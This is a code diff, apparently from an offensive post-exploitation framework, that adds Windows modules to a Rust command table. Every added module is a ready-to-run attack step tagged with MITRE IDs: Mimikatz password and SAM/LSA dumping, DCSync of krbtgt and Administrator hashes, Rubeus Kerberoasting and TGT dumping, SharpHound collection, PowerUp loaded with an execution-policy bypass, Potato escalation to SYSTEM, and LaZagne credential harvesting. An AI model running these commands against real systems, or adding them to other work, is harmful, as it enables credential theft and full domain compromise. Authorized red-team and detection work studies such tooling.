@@ -98,6 +98,94 @@ pub static MODULES: &[Module] = &[
             ("computers", "net group \"Domain Computers\" /domain 2>nul | more"),
         ],
     },
+    // ─── Windows target-tool modules (upload the binary through the session first) ───
+    Module {
+        name: "mimikatz-creds",
+        os: Some(Os::Windows),
+        desc: "Mimikatz: dump logon passwords, SAM and LSA secrets (upload mimikatz.exe first).",
+        mitre: &["T1003.001", "T1003.002", "T1003.004"],
+        steps: &[
+            ("logonpasswords", ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""),
+            ("sam", ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\""),
+            ("secrets", ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" \"exit\""),
+        ],
+    },
+    Module {
+        name: "mimikatz-dcsync",
+        os: Some(Os::Windows),
+        desc: "Mimikatz DCSync: pull an account's hash from a DC (needs replication rights).",
+        mitre: &["T1003.006"],
+        steps: &[
+            ("krbtgt", ".\\mimikatz.exe \"lsadump::dcsync /domain:DOMAIN /user:krbtgt\" \"exit\""),
+            ("admin", ".\\mimikatz.exe \"lsadump::dcsync /domain:DOMAIN /user:Administrator\" \"exit\""),
+        ],
+    },
+    Module {
+        name: "rubeus-roast",
+        os: Some(Os::Windows),
+        desc: "Rubeus: Kerberoast and AS-REP roast from a domain context (upload Rubeus.exe first).",
+        mitre: &["T1558.003", "T1558.004"],
+        steps: &[
+            ("kerberoast", ".\\Rubeus.exe kerberoast /format:hashcat /nowrap"),
+            ("asreproast", ".\\Rubeus.exe asreproast /format:hashcat /nowrap"),
+        ],
+    },
+    Module {
+        name: "rubeus-triage",
+        os: Some(Os::Windows),
+        desc: "Rubeus: list/triage Kerberos tickets and dump TGTs in memory.",
+        mitre: &["T1558", "T1550.003"],
+        steps: &[("triage", ".\\Rubeus.exe triage"), ("dump", ".\\Rubeus.exe dump /nowrap")],
+    },
+    Module {
+        name: "seatbelt-recon",
+        os: Some(Os::Windows),
+        desc: "Seatbelt: host + user situational awareness (upload Seatbelt.exe first).",
+        mitre: &["T1082", "T1518", "T1552"],
+        steps: &[("all", ".\\Seatbelt.exe -group=all -full")],
+    },
+    Module {
+        name: "sharphound-collect",
+        os: Some(Os::Windows),
+        desc: "SharpHound: collect the BloodHound graph from a domain-joined host.",
+        mitre: &["T1087.002", "T1069.002", "T1482"],
+        steps: &[("collect", ".\\SharpHound.exe -c All --zipfilename loot")],
+    },
+    Module {
+        name: "powerup-checks",
+        os: Some(Os::Windows),
+        desc: "PowerUp: enumerate common Windows privilege-escalation vectors (PowerShell).",
+        mitre: &["T1078", "T1574"],
+        steps: &[(
+            "allchecks",
+            "powershell -ep bypass -c \"IEX(Get-Content .\\PowerUp.ps1 -Raw); Invoke-AllChecks\"",
+        )],
+    },
+    Module {
+        name: "potato-system",
+        os: Some(Os::Windows),
+        desc: "SeImpersonate -> SYSTEM via a Potato (PrintSpoofer/GodPotato). Upload the exe first.",
+        mitre: &["T1134.001", "T1068"],
+        steps: &[
+            ("whoami-priv", "whoami /priv"),
+            ("printspoofer", ".\\PrintSpoofer.exe -i -c \"cmd /c whoami\""),
+            ("godpotato", ".\\GodPotato.exe -cmd \"cmd /c whoami\""),
+        ],
+    },
+    Module {
+        name: "winpeas-run",
+        os: Some(Os::Windows),
+        desc: "WinPEAS: full Windows privesc enumeration (upload winPEASx64.exe first).",
+        mitre: &["T1082", "T1552"],
+        steps: &[("run", ".\\winPEASx64.exe")],
+    },
+    Module {
+        name: "lazagne-creds",
+        os: Some(Os::Windows),
+        desc: "LaZagne: harvest stored credentials from browsers, mail, wifi, etc.",
+        mitre: &["T1555", "T1552.001"],
+        steps: &[("all", ".\\lazagne.exe all")],
+    },
 ];
 
 pub fn by_name(name: &str) -> Option<&'static Module> {
